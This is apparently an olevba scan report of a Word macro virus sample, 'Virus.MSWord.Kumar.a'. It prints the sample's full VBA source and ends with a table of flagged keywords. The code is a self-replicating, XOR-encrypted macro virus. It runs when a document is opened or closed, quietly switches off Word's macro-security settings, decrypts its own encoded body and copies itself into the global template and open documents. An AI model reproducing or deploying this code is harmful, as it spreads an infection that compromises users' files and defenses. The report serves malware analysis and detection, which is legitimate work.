olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Kumar.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Kumar.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'NVC
Dim NT, AD
Private Function KUKU() As Variant
'B`/Uc`|f5Drklw~<S{g”
'B~{y~|`:CemjJisi{|”€ЌЌDXFW
'B~{y~|`:Fwa}Wuiq|rO’ЋЏ“ђE[GX
'Lm{ygwW{vcz}wn5Nx{/ЏЋљ6Ђ…€…„Џ…€€ЉOMQB
'L~|xqr`|yy6]shlqf!Ќ‡‘ђ–FZHћЋ*Ђ€њ›ѓ?ќќ‘
'L~|xqr`|yy6\tz~q{\ЃЏЃ†€.ѓћHTJ[
'L~|xqr`|yy6JrtkKwl•ЂЋ!…–Џ„-ЌѓџѓџNRPA
'^k{0_F3)5Xxjt{wHxsoЊЂ–†J3$7љ†ЂЋЏ™@922ќћ„љ�’–Ќ‰SMTP</%'Ћ+!3+-
'^k{0PV3)5Wtlpl~Xr}jЌ„Њ—J3$7љ†ЂЋЏ™@922ќћ„љ�’–Ќ‰SMTP</%'Ћ+!3+-
'Dh/^E<_}{sd0(6;-4>#^A@D*3%EH=‚Ћ‚
'-.\ueSg`g6YwkwzpI{rђЌѓ—ЃK ’„…$ЉЃ€BO@
'-.AD?VvxpbrTpt~o=/3@/6M'Љ“‰њ&Њ'…ѓ‹њ
'-.AD?[}gpdcTpt~o=/3@ &M(Њ€‚›A[GL,*A3ћ‡ќЂ:ђ;‘—џ€U
'-.DEZG3)5'
'Hb|uXt3UQ8[qwh4,2?QHB_ZED@&?)IL9†Љћ
'-.\ueSg`g6V{msmyYq|•Њ‡ЌђK ’„…$ЉЃ€BO@
'-.NT?VvxpbrTpt~o=/3@ &M'Љ“‰њ&Њ'…ѓ‹њ
'-.NT?[}gpdcTpt~o=/3@/6M(Њ€‚›A[GL#:A3ћ‡ќЂ:ђ;‘—џ€U
'-.DEZG3)5$
'H`k0Xt
'Dh/Ctq|zq>Ywn3;!=SvЋ”–†L+‰ђAI>ѓ‰ѓN"ѓ–0њЊUT.—Њ€[џ’“Џ55'1dЊ(!-*>.(m,6pљ‡�Ѓwv|x/8�.‘8‹ЃЂ`KU_UANB_Њ…M†ђbWP@ZD›�‹Љ‹Ћџ’џцгБснспдйе¦«®Ъ·ёЭїЩЖЯА¶б©·Є©ѕ
End Function
Private Function Cry(Ctr) As String
On Error Resume Next
For A = 1 To Len(Ctr)
  S = S + Chr$(((Asc(Mid$(Ctr, A, 1)) - 32) Xor (A + 12)) + 32)
Next A: Cry = S
End Function
Private Sub Cr(CC)
On Error Resume Next
Set MC = ThisDocument.VBProject.VBComponents(1).CodeModule
If CC = 1 Then Set MC = NT
If CC = 2 Then Set MC = AD
If MC.Lines(1, 1) <> "'NVC" Then Exit Sub
For J = MC.ProcBodyLine("KUKU", vbext_pk_Proc) + 1 To MC.CountOfLines
  c = MC.Lines(J, 1)
  If Mid$(c, 1, 5) = "End F" Then Exit For
  If Mid$(c, 1, 1) = Chr(39) Then c = Cry(Mid$(c, 2, Len(c) - 1)) Else c = Chr(39) + Cry(Mid(c, 1, Len(c)))
  MC.ReplaceLine J, c
Next J
End Sub
Private Sub pp()
On Error Resume Next
System.PrivateProfileString("", Cry("EEJINQFFGSYLFOHYOBL/'64%7#;%Ђ‰™ѓћЃ‰„-=•’њ•’$HJUL!)ђ2%ћђ!&35!=3"), Cry("IaadE`fga_ykm{wpxzY‰Ќ‡ђ")) = 0
System.PrivateProfileString("", Cry("EEJINQFFGSYLFOHYOBL/'64%7#;%Ђ‰™ѓћЃ‰„-=•’њ•’$HJUL!)ђ2%ћђ!&35!=3"), Cry("Akyu}")) = 1
System.PrivateProfileString("", Cry("EEJINQFFGSYLFOHYOBL/'64%7#;%Ђ‰™ѓћЃ‰„-=•’њ•’$HJUL!)ђ2%ћђ!&35!=3"), Cry("LmlubaEVZ[")) = 1
Cr (0): D = KUKU: Cr (0): If D <> 0 Then Cr (D)
With ThisDocument: .Save: End With
If D = 2 Then
  With ActiveDocument: .Save: End With
End If
End Sub
Private Sub Document_Open(): pp: End Sub
Private Sub Document_Close(): pp: End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

